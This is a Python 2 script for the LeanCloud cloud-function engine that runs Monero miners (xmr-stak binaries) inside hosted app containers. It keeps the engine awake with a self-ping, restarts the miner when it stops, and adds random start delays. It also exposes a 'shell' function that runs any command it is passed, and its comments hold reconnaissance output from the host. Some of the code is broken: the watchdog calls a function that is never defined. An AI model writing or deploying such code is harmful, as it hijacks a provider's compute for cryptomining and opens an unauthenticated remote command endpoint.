# coding: utf-8
from leancloud import Engine
from leancloud import LeanEngineError

import subprocess
import select
import requests
import time
import random
import os   # 在云引擎 Python 环境中使用自定义的环境变量,WORK_ID=1
import codecs
import psutil

engine = Engine()


APP_ROOT = os.environ.get('LEANCLOUD_APP_REPO_PATH')
STR_CMD_MINE = 'PATH="$PATH:' + APP_ROOT +'" && echo $PATH && '

ENGNIE_RESTARTED = True
SUBPROCESS_RUNNING = False      #MineShell中进程有消息，就设为True, 但定时置为False，以便查看进程是否运行
XMRSTAK_RUNNING = False
NUM_ENGINE_LOOP = 0             #EngineLoop运行次数，用于决定是否唤醒自身
NUM_SUBPROCESS_LOOP = 0         #SUBPROCESS_RUNNING = False时的运行次数，用于决定是否重启Mine
APP_DOMAIN = os.environ.get('LEANCLOUD_APP_DOMAIN')     #domain和WORK_ID统一为一个标识符 LEANCLOUD_APP_REPO_PATH

print 'APP_ROOT:',APP_ROOT
print 'APP_DOMAIN:',APP_DOMAIN
print 'Please set domain and loop timer:18 * 0-23 * * ?'
print 'min10:18 0/10 6-23 * * ?'

########## Base Functions ##################
# Note:Set the field before: "pool_password" : "WORKER_ID"
STR_POOLS_FILENAME = 'pools.txt'

def Save_To_File(filename,text):
	ffile = codecs.open( filename, 'w', 'utf-8')
	ffile.write(text)
	ffile.close()

def Load_From_File(filename):
	ffile = codecs.open( filename, 'r', 'utf-8')
	text = ffile.read()
	ffile.close()
	return text

def Config_pools_File(app_domain):
	if(app_domain is None or ''==app_domain):
		print 'APP_DOMAIN is None!'
		app_domain = 'NoID'
	text = Load_From_File(STR_POOLS_FILENAME)
	idx_WORKER_ID = text.find('WORKER_ID')
	if(-1!=idx_WORKER_ID):
		text = text.replace('WORKER_ID', app_domain[0:6])
		Save_To_File(STR_POOLS_FILENAME, text)
	else:
		print 'WORKER_ID not find!'

###############################################

def MineShell( cmd, **params ):
	global SUBPROCESS_RUNNING
	print 'shell:',cmd
	result = subprocess.Popen(
		#[ "ping 127.0.0.1" ],
		#[ "find /usr" ],
		[ cmd ],
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE
	)
	# read date from pipe
	select_rfds = [ result.stdout, result.stderr ]
	while len( select_rfds ) > 0:
		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] ) #select函数阻塞进程，直到select_rfds中的套接字被触发
		SUBPROCESS_RUNNING = True
		if result.stdout in rfds:
			readbuf_msg = result.stdout.readline()      #行缓冲
			if len( readbuf_msg ) == 0:
				select_rfds.remove( result.stdout )     #result.stdout需要remove，否则进程不会结束
			else:
				print readbuf_msg,

		if result.stderr in rfds:
			readbuf_errmsg = result.stderr.readline()
			if len( readbuf_errmsg ) == 0:
				select_rfds.remove( result.stderr )     #result.stderr，否则进程不会结束
			else:
				print readbuf_errmsg,
	result.wait() # 等待字进程结束( 等待shell命令结束 )
	#print result.returncode
	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
	return result.returncode

@engine.define( 'xmrstak' )
def Mine_xmr_stak_Monero():
	global XMRSTAK_RUNNING
	if(XMRSTAK_RUNNING):
		print 'XMRSTAK_RUNNING'
		return True
	XMRSTAK_RUNNING = True
	print 'Mine_xmr_stak_Monero:xmrstak'
	time.sleep(random.randint(20, 50))
	str_cmd = './xmrstak'
	return MineShell(str_cmd)

@engine.define( 'xmrstak36s' )
def Mine_xmr_stak_Monero36s():
	global XMRSTAK_RUNNING
	if(XMRSTAK_RUNNING):
		print 'XMRSTAK_RUNNING'
		return True
	XMRSTAK_RUNNING = True
	print 'Mine_xmr_stak_Monero:xmrstak36s16'
	time.sleep(random.randint(20, 50))
	str_cmd = STR_CMD_MINE + 'xmrstak36s16'
	return MineShell(str_cmd)

#上传运行一次
# 15 5/15 9-23 * * ?
@engine.define( 'chmod' )
def cmd_chmod(**params):
	OutputShell('chmod +x xmrstak')
	OutputShell('chmod +x xmrstak36s16')
	OutputShell('ls -l')
	time.sleep(8)
	return True


@engine.define( 'ls' )
def cmd_ls(**params):
	OutputShell('ls -l')
	return True

@engine.define( 'top' )
def cmd_top(**params):
	OutputShell('top -b -n 1 -H')
	return True

@engine.define( 'ps' )
def cmd_ps(**params):
	OutputShell('ps -eLf')
	return True

@engine.define( 'pools' )
def cmd_cat_pools(**params):
	OutputShell('cat pools.txt')
	return True

@engine.define( 'cpuinfo' )
def cmd_cpuinfo(**params):
	OutputShell('cat /etc/issue && cat /proc/cpuinfo')
	return True

#半小时运行一次
# 15 5/15 9-23 * * ?
#@engine.define( 'heart' )
def Heart(**params):
	url = "http://" + APP_DOMAIN + ".leanapp.cn/heart"
	response = requests.get( url )
	print url,'..Heart End'
	return True

@engine.define( 'shell' )
# 调试 {'cmd':'ls -l' }
def OutputShell( cmd, **params ):
	global SUBPROCESS_RUNNING
	print 'shell:',cmd
	result = subprocess.Popen(
		#[ "ping 127.0.0.1" ],
		#[ "find /usr" ],
		[ cmd ],
		shell=True,
		stdout=subprocess.PIPE,
		stderr=subprocess.PIPE
	)
	# read date from pipe
	select_rfds = [ result.stdout, result.stderr ]
	while len( select_rfds ) > 0:
		(rfds, wfds, efds) = select.select( select_rfds, [ ], [ ] ) #select函数阻塞进程，直到select_rfds中的套接字被触发
		SUBPROCESS_RUNNING = True
		if result.stdout in rfds:
			readbuf_msg = result.stdout.readline()      #行缓冲
			if len( readbuf_msg ) == 0:
				select_rfds.remove( result.stdout )     #result.stdout需要remove，否则进程不会结束
			else:
				print readbuf_msg,

		if result.stderr in rfds:
			readbuf_errmsg = result.stderr.readline()
			if len( readbuf_errmsg ) == 0:
				select_rfds.remove( result.stderr )     #result.stderr，否则进程不会结束
			else:
				print readbuf_errmsg,
	result.wait() # 等待字进程结束( 等待shell命令结束 )
	#print result.returncode
	##(stdoutMsg,stderrMsg) = result .communicate()#非阻塞时读法.
	return result.returncode

# 1m运行一次
# 只需要一个定时器，解决全部定时任务
#@engine.define( 'engineloop' )
def EngineLoop(**params):
	global ENGNIE_RESTARTED
	global SUBPROCESS_RUNNING
	global NUM_ENGINE_LOOP
	global NUM_SUBPROCESS_LOOP

	if (NUM_ENGINE_LOOP % 30 == 29):  # 29Loop唤醒自身
		SUBPROCESS_RUNNING = False
		Heart()

	if (ENGNIE_RESTARTED):
		ENGNIE_RESTARTED = False
		Mine_cpuminer_Monero()
	else:
		# 检查进程过程中
		if (SUBPROCESS_RUNNING):
			NUM_SUBPROCESS_LOOP = 0
			print 'R',
		else:
			if (NUM_SUBPROCESS_LOOP < 7):
				print 'SUBPROCESS not in run',NUM_SUBPROCESS_LOOP
				NUM_SUBPROCESS_LOOP += 1
			else:
				NUM_SUBPROCESS_LOOP = 0     # 7Loop内无消息，认为进程结束了
				Mine_cpuminer_Monero()
	NUM_ENGINE_LOOP += 1
	return True

################################################
Config_pools_File(APP_DOMAIN)
OutputShell('cat pools.txt')
cmd_chmod()
################################################
#{'cmd':'top -b -n 1'}
#  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
#    1 leaneng+  20   0     200      4      0 S   0.0  0.0   0:00.07 dumb-init
#    9 leaneng+  20   0   17192   2168   1992 S   0.0  0.0   0:00.01 daemon
#   10 leaneng+  20   0 1048716  41388  22956 S   0.0  0.1   0:00.42 npm
#   26 leaneng+  20   0    4468    752    664 S   0.0  0.0   0:00.00 sh
#   27 leaneng+  20   0  918632  44520  22960 S   0.0  0.1   0:01.32 node
#   62 leaneng+  20   0   19760   2292   2032 R   0.0  0.0   0:00.00 top

#{'cmd':'top -b -n 1 -H -i'}


#{'cmd':' cat /proc/version '}
#Linux version 3.13.0-123-generic (buildd@lcy01-10) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #172-Ubuntu SMP Mon Jun 26 18:04:35 UTC 2017

#{'cmd':'grep "model name" /proc/cpuinfo'}
#model name : Common KVM CPU            #共7行
#model name	: Intel(R) Core(TM) i5 CPU         650  @ 3.20GHz

#{'cmd':'uname -a'}
#Linux 0ee7d925a033 3.13.0-123-generic #172-Ubuntu SMP Mon Jun 26 18:04:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
#Linux azhu 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

#{'cmd':'cat /proc/meminfo |grep -i hugepages'}
#AnonHugePages:    192512 kB
#HugePages_Total:       0
#HugePages_Free:        0
#HugePages_Rsvd:        0
#HugePages_Surp:        0
#Hugepagesize:       2048 kB

#{'cmd':' cat /proc/cpuinfo '}
#cpu MHz : 2593.748
#flags : fpu de pse tsc msr pae mce cx8 apic mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl pni cx16 sse4_1 sse4_2 x2apic popcnt aes avx hypervisor lahf_lm

#{'cmd':'cat /proc/cgroups'}
#subsys_name	hierarchy	num_cgroups	enabled
#cpuset	5	195	1
#cpu	12	722	1
#cpuacct	12	722	1
#memory	10	1968	1
#devices	2	721	1
#freezer	3	195	1
#net_cls	7	195	1
#perf_event	4	195	1
#net_prio	7	195	1
#hugetlb	11	195	1
#pids	6	722	1
#rdma	9	1	1

#{'cmd':'cat /proc/interrupts'}

#{'cmd':'cat /proc/softirqs'}
#{'cmd':'cat /proc/stat'}

#{'cmd':' cat /proc/cmdline '}
#BOOT_IMAGE=/boot/vmlinuz-4.4.0-72-generic root=/dev/vda1 ro video=800x600 cgroup_enable=memory swapaccount=1 console=ttyS0,115200n8
#BOOT_IMAGE=/boot/vmlinuz-4.13.0-36-generic root=UUID=a60681aa-fed1-496a-a211-fc83a4ce3fe0 ro quiet splash vt.handoff=7

#{'cmd':'cat /proc/interrupts'}

#{'cmd':'cat /proc/modules'}

#{'cmd':'cat /proc/thread-self/limits'}

#{'cmd':'ls /proc/23477/cwd'}

#{'cmd':'ps -eLf'}
#include thread
#UID        PID  PPID   LWP  C NLWP STIME TTY          TIME CMD
#leaneng+     9     1     9  0    1 14:56 ?        00:00:00 daemon -f -r -- npm start
#leaneng+    10     9    10  0   10 14:56 ?        00:00:00 npm
#leaneng+    10     9    11  0   10 14:56 ?        00:00:00 npm
#leaneng+    10     9    13  0   10 14:56 ?        00:00:00 npm
#leaneng+    10     9    14  0   10 14:56 ?        00:00:00 npm
#leaneng+    10     9    15  0   10 14:56 ?        00:00:00 npm
#leaneng+    10     9    22  0   10 14:56 ?        00:00:00 npm
#leaneng+    10     9    23  0   10 14:56 ?        00:00:00 npm
#leaneng+    10     9    24  0   10 14:56 ?        00:00:00 npm
#leaneng+    10     9    25  0   10 14:56 ?        00:00:00 npm
#leaneng+    26    10    26  0    1 14:56 ?        00:00:00 sh -c node server.js
#leaneng+    27    26    27  0    6 14:56 ?        00:00:00 node server.js
#leaneng+    27    26    28  0    6 14:56 ?        00:00:00 node server.js
#leaneng+    27    26    29  0    6 14:56 ?        00:00:00 node server.js
#leaneng+    27    26    30  0    6 14:56 ?        00:00:00 node server.js
#leaneng+    27    26    31  0    6 14:56 ?        00:00:00 node server.js
#leaneng+    39    27    39  0    1 15:04 ?        00:00:00 ps -eLf

#{'cmd':'ps -eLf | grep cpum'}
#XXX     23476 23470 23476  0    1 15:34 pts/20   00:00:00 /bin/sh -c PATH="$PATH:/home/azhu/Test_Prj/waylite" && echo $PATH && cpum --threads=1 --benchmark
#XXX     23477 23476 23477  0    3 15:34 pts/20   00:00:00 cpum --threads=1 --benchmark
#XXX     23477 23476 23478  0    3 15:34 pts/20   00:00:00 cpum --threads=1 --benchmark
#XXX     23477 23476 23479 34    3 15:34 pts/20   00:09:59 cpum --threads=1 --benchmark
#XXX     24758 15463 24758  0    1 16:03 pts/11   00:00:00 grep --color=auto cpum
